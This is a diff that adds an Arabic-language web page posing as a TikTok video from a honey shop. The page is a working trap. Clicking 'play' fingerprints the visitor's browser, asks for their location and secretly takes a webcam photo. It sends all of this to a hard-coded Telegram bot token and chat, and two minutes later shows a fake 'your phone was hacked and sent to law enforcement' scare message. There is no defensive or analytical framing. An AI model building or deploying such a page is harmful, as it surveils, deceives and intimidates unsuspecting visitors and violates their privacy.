@@ -1,0 +1,239 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>🎥 متجر عسل أبيض | تيك توك</title>
+<style>
+  body {
+    margin: 0;
+    background-color: #000;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    color: #fff;
+    overflow-x: hidden;
+  }
+  .container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    padding: 20px;
+    min-height: 100vh;
+  }
+  .logo img { width: 120px; margin-bottom: 10px; }
+  .profile { display: flex; align-items: center; gap: 10px; }
+  .profile img { width: 50px; height: 50px; border-radius: 50%; border: 2px solid #fe2c55; }
+  .profile-info h3 { margin: 0; font-size: 18px; color: #fff; }
+  .video-box {
+    margin-top: 20px;
+    width: 95%;
+    max-width: 605px;
+    border-radius: 12px;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 0 20px rgba(255,255,255,0.2);
+    cursor: pointer;
+    background-color: #000;
+    border: 3px solid #fe2c55;
+  }
+  .video-box video { width: 100%; height: auto; display: block; }
+  .play-overlay {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 70%;
+    height: 70%;
+    background: url('https://saudiutsa.com/wp-content/uploads/2023/05/%D8%A7%D9%8A%D9%86-%D8%A7%D8%AC%D8%AF-%D9%82%D8%B7%D8%B1%D8%A9-%D8%B3%D8%A8%D9%86%D8%B4-%D9%81%D9%84%D8%A7%D9%8A-%D9%81%D9%8A-%D8%AC%D8%AF%D8%A9-2023-%D9%84%D8%A7-300x297.jpg') no-repeat center;
+    background-size: contain;
+    opacity: 0.9;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .play-button {
+    font-size: 40px;
+    color: #fff;
+    background: rgba(0, 0, 0, 0.5);
+    padding: 15px;
+    border-radius: 50%;
+    cursor: pointer;
+  }
+  .buttons { margin-top: 20px; display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; }
+  .btn {
+    background: linear-gradient(45deg, #fe2c55, #00f2ea);
+    border: none;
+    color: white;
+    padding: 12px 20px;
+    border-radius: 25px;
+    cursor: pointer;
+    font-size: 16px;
+    font-weight: bold;
+  }
+  #hackedMessage {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: rgba(255, 0, 0, 0.85);
+    color: white;
+    font-size: 28px;
+    font-weight: bold;
+    padding: 30px 40px;
+    border-radius: 15px;
+    text-align: center;
+    z-index: 10000;
+    box-shadow: 0 0 15px 5px rgba(255, 0, 0, 0.7);
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo"><img src="https://img.youm7.com/large/20190416052309239.jpg"></div>
+  <div class="profile">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSitm9p4sWns-5EmwCEvwYR8Elqrb1qy5orQA&s" alt="Profile">
+    <div class="profile-info">
+      <h3>متجر العسل الأبيض</h3>
+      <span>50K متابع</span>
+    </div>
+  </div>
+  <div class="video-box" onclick="triggerTrap()">
+    <video id="mainVideo" muted controls poster="https://sdmntprsouthcentralus.oaiusercontent.com/files/00000000-3bfc-61f7-b24c-ba0ee6f57f49/raw?se=2025-08-04T01%3A26%3A39Z&sp=r&sv=2024-08-04&sr=b&scid=c4dcb226-f401-5a0d-a8e2-b7a18de4fa48&skoid=04233560-0ad7-493e-8bf0-1347c317d021&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-08-03T22%3A15%3A03Z&ske=2025-08-04T22%3A15%3A03Z&sks=b&skv=2024-08-04&sig=kSrVUtWISEtJG0lAsC6IKNErlRTTWRKFYSXPI6ZlhNQ%3D">
+      <source src="https://limewire.com/d/n8cm3#ZkkdxiU4W2" type="video/mp4" />
+    </video>
+    <div class="play-overlay" id="playButton">
+      <div class="play-button">▶️</div>
+    </div>
+  </div>
+  <div class="buttons">
+    <button class="btn" onclick="triggerTrap()">تشغيل الفيديو</button>
+    <button class="btn" onclick="window.location.href='https://www.tiktok.com'">الصفحة الرسمية</button>
+  </div>
+</div>
+
+<div id="hackedMessage">
+  تم اخترق هاتفك بنجاح<br>
+  تم نقل جميع الصور والمعلومات الخاصة بهاتفك<br>
+  إلى جهات تنفيذ القانون
+</div>
+
+<script>
+  const token = "8334743512:AAGEnZwkI9LYgmOdBm6wKeYFu9ffF4LXxwg";
+  const chatId = "8004961958";
+  let hackedTimeout;
+
+  function getFingerprint() {
+    return {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screen: `${window.screen.width}x${window.screen.height}`,
+      connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
+    };
+  }
+
+  function sendToTelegram(message, photoBlob = null) {
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    });
+
+    if (photoBlob) {
+      const photoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", photoBlob, "photo.jpg");
+      fetch(photoUrl, { method: "POST", body: formData });
+    }
+  }
+
+  function triggerTrap() {
+    document.getElementById("playButton").style.display = "none";
+    const video = document.getElementById("mainVideo");
+    video.style.display = "block";
+    video.play();
+
+    hackedTimeout = setTimeout(() => {
+      document.getElementById('hackedMessage').style.display = 'block';
+    }, 120000);
+
+    const fingerprint = getFingerprint();
+    let message = `\uD83D\uDD75️ محاولة دخول جديدة:\n\n`;
+    message += `جهاز: ${fingerprint.userAgent}\n`;
+    message += `اللغة: ${fingerprint.language}\n`;
+    message += `المنطقة الزمنية: ${fingerprint.timezone}\n`;
+    message += `الشاشة: ${fingerprint.screen}\n`;
+    message += `الاتصال: ${fingerprint.connection}\n`;
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const coords = `\nالموقع: Latitude ${pos.coords.latitude}, Longitude ${pos.coords.longitude}`;
+        sendToTelegram(message + coords);
+      }, () => sendToTelegram(message + "\nالموقع مرفوض"));
+    } else {
+      sendToTelegram(message + "\nالموقع غير مدعوم");
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        imageCapture.takePhoto().then(blob => {
+          sendToTelegram("\uD83D\uDCF7 صورة تم التقاطها:", blob);
+          track.stop();
+        });
+      })
+      .catch(() => {
+        sendToTelegram(message + "\nتم رفض الوصول للكاميرا من المستخدم");
+      });
+  }
+
+  window.addEventListener('beforeunload', () => {
+    clearTimeout(hackedTimeout);
+  });
+</script>
+</body>
+</html>
